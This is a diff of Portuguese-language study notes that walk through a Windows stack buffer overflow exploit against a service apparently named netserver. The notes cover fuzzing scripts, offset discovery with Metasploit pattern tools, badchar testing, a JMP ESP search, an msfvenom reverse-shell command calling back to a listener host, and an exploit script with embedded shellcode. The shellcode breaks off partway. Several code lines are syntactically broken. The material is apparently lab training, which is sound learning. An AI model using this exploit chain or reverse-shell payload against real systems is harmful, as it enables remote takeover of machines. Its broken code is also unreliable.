@@ -3031,23 +3031,39 @@ Nota: Usar o STRNCPY e informar o numero de chars que fica seguro ou informar no
 ## BUFFER OVERFLOW - WINDOWS
 
 
-#/usr/bin/python
+	#/usr/bin/python
 
-import socket
+	import socket
 
-lista=["A"]
+	lista=["A"]
 
-contador=100
+	contador=100
 
-while len(lista) <= 50:
+	while len(lista) <= 50:
 
-	lista.append("A"*contador)
+		lista.append("A"*contador)
 
-	contador = contador + 100
+		contador = contador + 100
 
-for dados in lista:
+	for dados in lista:
 
-	print "Fuzzing com SEND %s bytes"%len(dados)
+		print "Fuzzing com SEND %s bytes"%len(dados)
+
+		s.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+		s.connect(("192.168.254.207", 1020))
+
+		banner = s.recv(1024)
+
+		s.send("SEND "+dados"\r\n")
+
+Com esse código acima você descobre até onde a aplicação quebra, depois é descoberto o número exato que ela de fato quebra... como é feito testando com o código abaixo.
+
+	#/usr/bin/python
+
+	import socket
+
+	dados = "A" * 2000 + "B" * 100 + "C" 100
 
 	s.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -3057,271 +3073,256 @@ for dados in lista:
 
 	s.send("SEND "+dados"\r\n")
 
-Com esse código acima você descobre até onde a aplicação quebra, depois é descoberto o número exato que ela de fato quebra... como é feito testando com o código abaixo.
-
-#/usr/bin/python
-
-import socket
-
-dados = "A" * 2000 + "B" * 100 + "C" 100
-
-s.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-s.connect(("192.168.254.207", 1020))
-
-banner = s.recv(1024)
-
-s.send("SEND "+dados"\r\n")
-
 A aplicação quebra em 2200, então a ideia é ir quebrando até chegar #no número exato que a aplicação quebra. 2200 é o número de bytes que a aplicação quebra como testado com o código acima.
 
     Locate pattern_create
 
-        Localiza o pattern_create
+Localiza o pattern_create
 
     /usr/bin/msf-pattern_create -l 2200 
 
-        Descobrir qual o padrão para pesquisar o offset no msf-pattern, deve ser usado com o código em python para enviar e monitorar com o Immunity o EIP
+Descobrir qual o padrão para pesquisar o offset no msf-pattern, deve ser usado com o código em python para enviar e monitorar com o Immunity o EIP
 
     /usr/bin/msf-pattern_offset -l 2200 -q ED3R3EIP 
 
-        Com os dados em EIP informar na query e saber o offset para criar o exploit do buffer overflow
+Com os dados em EIP informar na query e saber o offset para criar o exploit do buffer overflow
 
 
 Nota: Para saber se tem espaço para o shellcode é necessário enviar mais letras após o tamanho dos bits encontrado no EIP para saber se cabe pelo menos 300 caracteres que seria o equivalente ao tamanho do shellcode
 
-    Gerando badchars com Python
+Gerando badchars com Python
 
-for num in range(1, 256):
+	for num in range(1, 256):
 
-    print hex(num).replace('0x','\\x'),
+  	print hex(num).replace('0x','\\x'),
 
-"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+	"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 
 
 De uma forma automatizada para criar badchars é usando o !MONA bytearray No Immunity debugger 
 
 Para fazer o teste dos badchars é necessário mandar os caracteres gerados e dar um following dump para saber se tem algum char faltando e eliminar do shellcode, geralmente o \x00 \x0a \x0d
 
-Pesquisando JUMP ESP
+- Pesquisando JUMP ESP
 
 Com 2007 bytes e 4 bytes em EIP eu quebro a aplicação
 
 E EIP apontando para ESP eu consigo colocar uma shell e ganhar acesso, mas para encontrar o endereço de retorno é necessário encontrar um endereço que faça um JMP ESP pois ESP sempre muda de endereço...COMO? Procura as dlls carregadas em E com direito na dll (preferência do programa) -> view code CPU -> search-for-command JMP ESP e copia o endereço para usar no Ponteiro. ALTERNATIVA !mona modules Verifica as que tem ASL (proteção) inativa ou !mona find -s "\xff\xe4" -m netserver.dll (dll que tem ASL em false) com o endereço, copia ele e clica na setinha azul do Immunity e vai para o endereço seta um breakpoint, prepara o codigo ex.: 0x625012a0 -> "\xa0\x12\x50\x62" Adiciona os NOPs "\x90" * 32
 
-Gerando o shellcode
+- Gerando o shellcode
+.
 
     msfvenom -p windows/shell_reverse_tcp lhost=192.168.2.10 lport=443 exitfunc-thread -b "\x00" -f c
 
-        Comando para gerar o shellcode já excluindo os badchars (basta colocar o código e refazer o envio já inserindo o shellcode) Depois é só rodar o exploit e pronto.
+Comando para gerar o shellcode já excluindo os badchars (basta colocar o código e refazer o envio já inserindo o shellcode) Depois é só rodar o exploit e pronto.
 
 
-    Exploit criado para netserver
+Exploit criado para netserver
 
-#!/usr/bin/python
+	#!/usr/bin/python
 
-import socket
+	import socket
 
-#send = "A" * 1500 + "B" * 1500
+	#send = "A" * 1500 + "B" * 1500
 
-#send = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D"
+	#send = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D"
 
-#send = "A" * 2007 + "BBBB" 0x625012a0
+	#send = "A" * 2007 + "BBBB" 0x625012a0
 
-#badchar \x00
+	#badchar \x00
 
-#send = "A" * 2007 + "\xa0\x12\x50\x62" + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+	#send = "A" * 2007 + "\xa0\x12\x50\x62" + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 
-shell = ("\xd9\xca\xb8\x8e\x06\xc1\xab\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
+	shell = ("\xd9\xca\xb8\x8e\x06\xc1\xab\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
 
-"\x52\x83\xc7\x04\x31\x47\x13\x03\xc9\x15\x23\x5e\x29\xf1\x21"
+	"\x52\x83\xc7\x04\x31\x47\x13\x03\xc9\x15\x23\x5e\x29\xf1\x21"
 
-"\xa1\xd1\x02\x46\x2b\x34\x33\x46\x4f\x3d\x64\x76\x1b\x13\x89"
+	"\xa1\xd1\x02\x46\x2b\x34\x33\x46\x4f\x3d\x64\x76\x1b\x13\x89"
 
-"\xfd\x49\x87\x1a\x73\x46\xa8\xab\x3e\xb0\x87\x2c\x12\x80\x86"
+	"\xfd\x49\x87\x1a\x73\x46\xa8\xab\x3e\xb0\x87\x2c\x12\x80\x86"
 
-"\xae\x69\xd5\x68\x8e\xa1\x28\x69\xd7\xdc\xc1\x3b\x80\xab\x74"
+	"\xae\x69\xd5\x68\x8e\xa1\x28\x69\xd7\xdc\xc1\x3b\x80\xab\x74"
